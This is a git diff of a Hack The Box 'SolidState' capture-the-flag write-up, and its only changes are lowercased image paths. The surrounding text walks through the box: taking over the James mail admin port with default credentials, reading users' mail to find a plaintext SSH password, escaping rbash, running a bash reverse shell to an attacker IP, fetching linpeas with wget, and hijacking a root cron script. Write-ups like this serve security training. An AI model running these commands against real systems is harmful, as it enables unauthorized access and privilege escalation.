@@ -10,7 +10,7 @@ tags: [ctf,hackthebox,writeup,linux,medium]
 
 #### nmap Scan Results
 
-![Image](/assets/img/Solidstate/image.png)
+![Image](/assets/img/solidstate/image.png)
 
 #### Dirbuster Result
 
@@ -91,7 +91,7 @@ Nothing interesting here
 
 ### Vulnerabilities
 
-![Image](/assets/img/Solidstate/image_1.png)
+![Image](/assets/img/solidstate/image_1.png)
 
 ### Exploitation
 
@@ -105,19 +105,19 @@ TCP port 4555 is interesting because it is the James administration port. Even w
 
 We are able to access using default root root creds
 
-![Image](/assets/img/Solidstate/image_2.png)
+![Image](/assets/img/solidstate/image_2.png)
 
-![Image](/assets/img/Solidstate/image_3.png)
+![Image](/assets/img/solidstate/image_3.png)
 
 We have these users, lets change the pass for them and then access and check out their mails
 
-![Image](/assets/img/Solidstate/image_4.png)
+![Image](/assets/img/solidstate/image_4.png)
 
 #### User Content
 
 ##### James
 
-![Image](/assets/img/Solidstate/image_5.png)
+![Image](/assets/img/solidstate/image_5.png)
 
 ##### Thomas
 
@@ -125,9 +125,9 @@ Thomas has nothing
 
 ##### John
 
-![Image](/assets/img/Solidstate/image_6.png)
+![Image](/assets/img/solidstate/image_6.png)
 
-![Image](/assets/img/Solidstate/image_7.png)
+![Image](/assets/img/solidstate/image_7.png)
 
 #### Mindy's Mail
 
@@ -137,13 +137,13 @@ Lets check mindys mail
 
 Mindy has 2 mails
 
-![Image](/assets/img/Solidstate/image_8.png)
+![Image](/assets/img/solidstate/image_8.png)
 
 Lets check them out
 
-![Image](/assets/img/Solidstate/image_9.png)
+![Image](/assets/img/solidstate/image_9.png)
 
-![Image](/assets/img/Solidstate/image_10.png)
+![Image](/assets/img/solidstate/image_10.png)
 
 #### Obtaining SSH Credentials
 
@@ -151,13 +151,13 @@ Ok so we have our ssh creds now which is mindy:P@55W0rd1!2@
 
 Mailadmin does not have any which is ironic
 
-![Image](/assets/img/Solidstate/image_11.png)
+![Image](/assets/img/solidstate/image_11.png)
 
 Right off we have our user flag
 
-![Image](/assets/img/Solidstate/image_12.png)
+![Image](/assets/img/solidstate/image_12.png)
 
-![Image](/assets/img/Solidstate/image_13.png)
+![Image](/assets/img/solidstate/image_13.png)
 
 #### Escaping rbash
 
@@ -167,7 +167,7 @@ Lets try getting out of here first
 
 Running cat/etc/passwd also shows us what shell mindy has access to
 
-![Image](/assets/img/Solidstate/image_14.png)
+![Image](/assets/img/solidstate/image_14.png)
 
 We can use the -t switch and specify bash and it would log us in with the bash shell instead of the intended rbash.
 
@@ -188,21 +188,21 @@ Lets use this payload
 
 ```bash -i >& /dev/tcp/10.10.14.35/8080 0>&1```
 
-![Image](/assets/img/Solidstate/image_16.png)
+![Image](/assets/img/solidstate/image_16.png)
 
-![Image](/assets/img/Solidstate/image_17.png)
+![Image](/assets/img/solidstate/image_17.png)
 
-![Image](/assets/img/Solidstate/image_18.png)
+![Image](/assets/img/solidstate/image_18.png)
 
 Annnd we have our shell
 
-![Image](/assets/img/Solidstate/image_19.png)
+![Image](/assets/img/solidstate/image_19.png)
 
 #### Post-Exploitation
 
 Lets try accessing admin with this now
 
-![Image](/assets/img/Solidstate/image_20.png)
+![Image](/assets/img/solidstate/image_20.png)
 
 We will still have to do some privesc, lets get linpeas on this and start enumerating for some vectors
 
@@ -214,29 +214,29 @@ And then we use this command on the victim's machine to grab it
 
 ```wget [http://10.10.14.35:8000/linpeas.sh](http://10.10.14.35:8000/linpeas.sh)```
 
-![Image](/assets/img/Solidstate/image_21.png)
+![Image](/assets/img/solidstate/image_21.png)
 
 Now lets run it (run it immediately, I noticed that files put in the tmp dir are being removed periodically)
 
-![Image](/assets/img/Solidstate/image_22.png)
+![Image](/assets/img/solidstate/image_22.png)
 
 #### Privilege Escalation
 
 Ok so there seems to be a cron job running under root, I’m not getting info on what is being run actually
 
-![Image](/assets/img/Solidstate/image_23.png)
+![Image](/assets/img/solidstate/image_23.png)
 
 Lets run a more thorough scan with linEnum
 
 [https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
 
-![Image](/assets/img/Solidstate/image_24.png)
+![Image](/assets/img/solidstate/image_24.png)
 
-![Image](/assets/img/Solidstate/image_25.png)
+![Image](/assets/img/solidstate/image_25.png)
 
 This file is pretty interesting, it has root permissions but is writable to the user
 
-![Image](/assets/img/Solidstate/image_26.png)
+![Image](/assets/img/solidstate/image_26.png)
 
 Lets check out the processes as well with pspy
 
@@ -246,29 +246,29 @@ The Linux version `4.9.0-3-686-pae` indicates that this is a 32-bit kernel. The 
 
 So lets use the 32 bit version of pspy
 
-![Image](/assets/img/Solidstate/image_27.png)
+![Image](/assets/img/solidstate/image_27.png)
 
-![Image](/assets/img/Solidstate/image_28.png)
+![Image](/assets/img/solidstate/image_28.png)
 
 Ok so this process seems to be running every 3 minutes and we know it's being run with root privs.
 
 Lets check this file out
 
-![Image](/assets/img/Solidstate/image_29.png)
+![Image](/assets/img/solidstate/image_29.png)
 
 Ok so this was the file responsible for cleaning up tmp every 3 minutes, lets change it so that we get a rev shell instead.
 
 Lets upgrade our shell a bit first
 
-![Image](/assets/img/Solidstate/image_30.png)
+![Image](/assets/img/solidstate/image_30.png)
 
 Now lets edit the [tmp.py](http://tmp.py) file
 
 and in 3 minutes we should have gotten our shell
 
-![Image](/assets/img/Solidstate/image_33.png)
+![Image](/assets/img/solidstate/image_33.png)
 
-![Image](/assets/img/Solidstate/image_31.png)
+![Image](/assets/img/solidstate/image_31.png)
 
 #### Final Privilege Escalation
 
@@ -286,7 +286,7 @@ Next, we need to wait for the cron job to execute the modified `tmp.py`. Once it
 
 After receiving the connection, we will have an elevated shell with root privileges. We can then check for the root flag:
 
-![Image](/assets/img/Solidstate/image_32.png)
+![Image](/assets/img/solidstate/image_32.png)
 
 Finally, we obtain the root flag
 
